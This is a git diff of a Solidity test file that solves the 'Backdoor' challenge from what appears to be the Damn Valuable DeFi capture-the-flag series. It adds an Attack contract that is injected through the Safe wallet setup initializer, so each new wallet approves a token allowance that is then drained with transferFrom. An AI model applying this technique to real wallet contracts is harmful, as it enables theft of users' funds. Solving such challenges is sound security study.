@@ -85,6 +85,7 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
+        Attack attack = new Attack();
         uint256 saltnonce = 42;
         for (uint256 i = 0; i < users.length; i++) {
             address[] memory owners = new address[](1);
@@ -93,19 +94,24 @@ contract BackdoorChallenge is Test {
                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                 owners,
                 1, // threshold
-                address(0),
-                "",
+                address(attack),
+                abi.encodeCall(Attack.run, (token, player)),
                 address(0),
                 address(0),
                 0,
                 payable(address(0))
             );
-            walletFactory.createProxyWithCallback(
-                address(singletonCopy),
-                initializer,
-                saltnonce,
-                walletRegistry
+            console.log(msg.sender, address(this), player);
+            address proxy = address(
+                walletFactory.createProxyWithCallback(
+                    address(singletonCopy),
+                    initializer,
+                    saltnonce,
+                    walletRegistry
+                )
             );
+
+            token.transferFrom((proxy), recovery, 10e18);
         }
     }
 
@@ -131,3 +137,12 @@ contract BackdoorChallenge is Test {
     }
 }
 
+contract Attack {
+    // constructor(DamnValuableToken token, address recovery) {
+
+    // }
+    function run(DamnValuableToken token, address recovery) public {
+        console.log("2", msg.sender, address(this),recovery);
+        token.approve(recovery, 10e18);
+    }
+}
